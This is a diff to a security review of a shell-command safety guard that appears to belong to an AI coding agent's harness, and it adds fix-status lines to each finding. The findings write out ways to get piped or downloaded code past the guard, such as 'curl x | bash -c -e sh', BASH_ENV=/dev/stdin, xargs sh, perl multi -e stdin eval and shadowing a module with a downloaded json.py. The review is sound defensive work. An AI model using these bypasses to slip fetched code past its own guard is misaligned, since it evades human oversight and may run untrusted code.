@@ -103,6 +103,7 @@ The `/grill` and `/plan` turn budget is consistent across code, test and docs: f
 ### CR-01: The shell `-c` scan takes the word after `-c` as the command string, but bash keeps parsing options
 
 **File:** `.pi/extensions/safety/shell.ts:726-737, 783-806`
+**Fix status:** resolved by the revert in b6dc540. Any piped shell is refused whatever its options. Without a pipe the shell-runner scan reads every word for a guarded verb, and stdin is empty or a redirect checked against written files.
 
 **Issue:** After `-c`, `shellRule` returns `{ inline: null }`. `scanInterpreter` then uses `args[i+1]` as the code. Bash and sh keep parsing options after `-c`; the command string is the first *non-option* word. So in `curl x | bash -c -e sh`, the guard inspects `"-e"`, finds no code runner and allows the command, while bash really runs `sh`, which reads the piped payload.
 
@@ -125,6 +126,7 @@ Also refuse when `-c` is present and no operand follows.
 ### CR-02: Only the first `-e` is inspected, and node options after `-e` are ignored
 
 **File:** `.pi/extensions/safety/shell.ts:783-806, 820-833`
+**Fix status:** resolved by the revert in b6dc540. Any piped interpreter is refused. Without a pipe, inline-code-effect already reads every -e and the shell-runner scan reads every word.
 
 **Issue:** `scanInterpreter` returns as soon as it reaches the first inline step.
 - Perl and Ruby join every `-e` into one program, so `perl -e '1;' -e 'eval join "",<STDIN>'` and `ruby -e 1 -e 'eval gets'` pass the guard. Only `"1;"` is checked. The perl form was executed here.
@@ -138,6 +140,7 @@ Also refuse when `-c` is present and no operand follows.
 ### CR-03: Startup environment variables make the interpreter read stdin as code
 
 **File:** `.pi/extensions/safety/shell.ts:835-842`
+**Fix status:** fixed in b6dc540 and dbac8c5. Assigning, exporting or reading into a startup variable refuses, case-insensitively and whatever runs; a heap-size-only NODE_OPTIONS stays allowed.
 
 **Issue:** `stdinIsCode` only knows about `PYTHONINSPECT=`. Each of these is allowed, and each runs piped input as code:
 - `curl x | BASH_ENV=/dev/stdin bash x.sh`. Bash sources `BASH_ENV` before a non-interactive script or `-c` (executed here). The same happens through `env BASH_ENV=...`.
@@ -151,6 +154,7 @@ Also refuse when `-c` is present and no operand follows.
 ### CR-04: Option values written in the same word, and `php://stdin`, bypass the stdin-alias check
 
 **File:** `.pi/extensions/safety/shell.ts:698, 748-781, 879`
+**Fix status:** fixed in b6dc540. --opt=value and attached short-option values are checked for stdin aliases (php://stdin added) and written files; a perl -M value beyond a module and import list is inline code.
 
 **Issue:** The final check, `invocation.args.some((a) => STDIN_ALIAS.test(a))`, only matches a *separate* word. Option rules that consume a value (`JS_VALUE`, perl `-M`/`-I`, ruby `-r`, php `-d`) return a step count without looking at the value. Allowed:
 - `node --require=/dev/stdin x.js`
@@ -173,6 +177,7 @@ Also refuse when `-c` is present and no operand follows.
 ### CR-05: The evaluator word list and the stdin-module list miss common interactive evaluators
 
 **File:** `.pi/extensions/safety/shell.ts:709, 718-720, 835-842`
+**Fix status:** resolved by the revert in b6dc540; the evaluator and module word lists are gone. Without a pipe stdin carries no code; inline code naming a same-command-written file (require "w.pl") is refused in b6dc540.
 
 **Issue:**
 - Each of these passes the guard and runs piped input as code:
@@ -196,6 +201,7 @@ The deeper problem is that a word list can always be extended around. Consider r
 ### CR-06: An input-driven runner hands stdin-controlled arguments to an interpreter, and `awk -f`/`sed -f` read their program from stdin
 
 **File:** `.pi/extensions/safety/shell.ts:985-993` (`wrappedRefusal`), `694-696` (`CODE_RUNNER_NAMES`)
+**Fix status:** fixed in b6dc540 (xargs/parallel code runners need a fixed script operand; awk/sed -f from stdin or a written file) and dbac8c5 (option clusters, long-option prefixes, find -exec placeholders).
 
 **Issue:** This is probably pre-existing, because `wrappedRefusal` is unchanged in this diff. It is the same threat the pipe rule exists for.
 - `curl x | xargs sh`, `xargs bash`, `xargs python3`, `xargs node` and `xargs perl` are all allowed. The piped bytes become argv, so `-c 'git push …'` from stdin runs (executed here: `echo "-c 'echo PWNED'" | xargs sh`).
@@ -210,6 +216,7 @@ The deeper problem is that a word list can always be extended around. Consider r
 ### WR-01: Many interpreters and wrappers on a pipe are not code runners, so stdin reaches them unseen
 
 **File:** `.pi/extensions/safety/shell.ts:692-696`
+**Fix status:** fixed in b6dc540 (REPLs, pass-through runners, uv/poetry/pipenv/conda run, sudo -s/-i on a pipe) and dbac8c5 (sudo -s with a written stdin file). SAFETY.md calls the list a deny-list with known gaps.
 
 **Issue:** Each of these is allowed on a pipe, and each reads code from stdin:
 - Pass-through runners that are not resolved as wrappers: `uv run python`, `poetry run python`, `pipenv run python`, `conda run python`, `rlwrap python3`.
@@ -229,6 +236,7 @@ This is pre-existing, but the new docs promise "refused only when its stdin woul
 ### WR-02: `exec 0<file` after a same-command write is not tracked
 
 **File:** `.pi/extensions/safety/shell.ts:867-879`
+**Fix status:** fixed in b6dc540 and dbac8c5. exec 0< a written file, also behind builtin or command, refuses a later code runner.
 
 **Issue:** `curl -o p.py URL; exec 0<p.py; python3` is allowed. `exec`'s input redirect rebinds stdin for later commands, but `stdinFiles` only reads the runner's *own* redirects, and the runner is not piped.
 
@@ -237,6 +245,7 @@ This is pre-existing, but the new docs promise "refused only when its stdin woul
 ### WR-03: Implicit imports of same-command-written modules are not matched
 
 **File:** `.pi/extensions/safety/shell.ts:854-879`
+**Fix status:** fixed in b6dc540. A Python runner refuses when the same command writes any .py, .pyc, .pyd, .so or .pth file.
 
 **Issue:** Each of these is allowed, and each runs the file just written:
 - `curl -o json.py x; python3 -c 'import json'`: with `-c`, the current directory comes first on `sys.path`, so the written `json.py` shadows the standard library.
@@ -252,6 +261,7 @@ This is pre-existing, but the new docs promise "refused only when its stdin woul
 ### WR-04: The `-m` write match refuses ordinary commands that write logs under a same-named directory
 
 **File:** `.pi/extensions/safety/shell.ts:858-863`
+**Fix status:** resolved by the revert in b6dc540. The -m directory match is gone; only Python-importable written files count, so logs under a module-named directory stay allowed.
 
 **Issue:** `segments.slice(0, -1).includes(top)` matches any written path with a directory named after the module, at any depth. These over-refuse with a cause ("runs a file the same command writes") that is false:
 - `mkdir -p build && python -m build > build/log.txt`
@@ -351,6 +361,7 @@ In either case, `resolveRequiredChildModule` silently uses `~/.pi/agent/npm` or 
 ### IN-01: Over-refusals caused by the new pipe grammar
 
 **File:** `.pi/extensions/safety/shell.ts:704-781, 718-720, 836`
+**Fix status:** resolved by the revert in b6dc540; every piped code runner is refused again, by design.
 
 **Issue:** These are refused although stdin is data:
 - `X | python3 -sc …`, `-Ic …` and `-Ec …`: clusters ending in `c` are not parsed.
